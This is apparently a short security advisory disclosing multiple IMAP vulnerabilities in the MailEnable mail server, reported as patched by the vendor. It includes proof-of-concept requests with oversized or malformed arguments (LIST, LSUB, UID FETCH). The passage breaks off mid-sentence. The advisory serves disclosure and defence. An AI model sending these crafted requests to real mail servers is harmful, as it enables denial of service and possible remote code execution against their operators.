MailEnable's mail server software provides a powerful, scalable 
hosted messaging platform for Microsoft Windows. MailEnable 
offers stability, unsurpassed flexibility and an  extensive 
feature set which allows you to provide cost-effective mail 
services.


-=[ Technical Description

Multiple vulnerabilities has been identified in MailEnable, 
which may be exploited by remote attackers to cause a denial 
of service, or could lead to remote execution of code. This 
issue is due to an error in the IMAP service that does not 
properly handle specially crafted requests.


-=[ Proof of Concepts

IMAP REQUEST: '02 LIST /.:/' + Ax5000 
IMAP REQUEST: '02 LSUB' /.:/ ('A' x 5000)  request
IMAP REQUEST: '02 UID FETCH /.:/' AX5000  ' FLAGS'
IMAP REQUEST: '02 UID FETCH /...'x5 ' FLAGS'
IMAP REQUEST: '02 UID FETCH '/\'x5000 '

Several others exist and all have been reported to the vendor.

According to Peter Fregon of MailEnable Pty. Ltd, these advisories have been
patched in the latest ME-10009 Patch.  Any further questions should be
